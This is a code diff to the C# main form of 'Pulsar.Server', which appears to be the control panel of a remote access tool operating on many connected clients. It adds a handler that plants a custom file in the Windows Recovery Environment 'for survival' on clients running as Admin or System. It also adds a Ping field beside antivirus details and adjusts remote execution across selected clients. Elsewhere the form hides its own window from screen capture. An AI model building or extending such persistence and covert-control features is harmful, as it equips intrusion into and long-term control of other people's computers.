@@ -59,6 +59,9 @@ namespace Pulsar.Server.Forms
             _clientDebugLogHandler = new ClientDebugLog();
             RegisterMessageHandler();
             InitializeComponent();
+            typeof(ListView).InvokeMember("DoubleBuffered",
+                System.Reflection.BindingFlags.SetProperty | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
+                null, this.lstClients, new object[] { true });
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
@@ -375,7 +378,7 @@ namespace Pulsar.Server.Forms
                     MessageHandler.Unregister(_previewImageHandler);
                     _previewImageHandler.Dispose();
                 }
-
+                
                 _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
                 MessageHandler.Register(_previewImageHandler);
 
@@ -384,7 +387,7 @@ namespace Pulsar.Server.Forms
                     Quality = 20,
                     DisplayIndex = 0
                 };
-
+                
                 if (chkDisablePreview.Checked)
                 {
                     return;
@@ -418,9 +421,13 @@ namespace Pulsar.Server.Forms
                 antivirusItem.SubItems.Add("N/A");
                 clientInfoListView.Items.Add(antivirusItem);
 
-                var mainBrowserItem = new ListViewItem("Main Browser");
+                var mainBrowserItem = new ListViewItem("Default Browser");
                 mainBrowserItem.SubItems.Add("N/A");
                 clientInfoListView.Items.Add(mainBrowserItem);
+
+                var pingItem = new ListViewItem("Ping");
+                pingItem.SubItems.Add("N/A");
+                clientInfoListView.Items.Add(pingItem);
             }
         }
 
@@ -1153,6 +1160,25 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void winRECustomFileForSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    FrmCustomFileStarter frmCustomFile = new FrmCustomFileStarter(c, typeof(AddCustomFileWinRE), false);
+                    frmCustomFile.ShowDialog();
+                    frmCustomFile.Focus();
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
         private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1186,7 +1212,7 @@ namespace Pulsar.Server.Forms
             Client[] clients = GetSelectedClients();
             if (clients.Length > 0)
             {
-                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients, true);
                 frmRe.Show();
             }
         }
@@ -2066,13 +2092,13 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void remoteSystemSoundToolStripMenuItem_Click(object sender, EventArgs e)
+        private void remoteSystemAudioToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
             {
-                var frmAudio = FrmRemoteSystemAudio.CreateNewOrGetExisting(c);
-                frmAudio.Show();
-                frmAudio.Focus();
+                var frmSysAudio = FrmRemoteSystemAudio.CreateNewOrGetExisting(c);
+                frmSysAudio.Show();
+                frmSysAudio.Focus();
             }
         }
 
@@ -2171,16 +2197,6 @@ namespace Pulsar.Server.Forms
         private void winREToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             AddTask("WinRE", "", "");
-        }
-
-        private void remoteSystemAudioToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                var frmSysAudio = FrmRemoteSystemAudio.CreateNewOrGetExisting(c);
-                frmSysAudio.Show();
-                frmSysAudio.Focus();
-            }
         }
     }
 
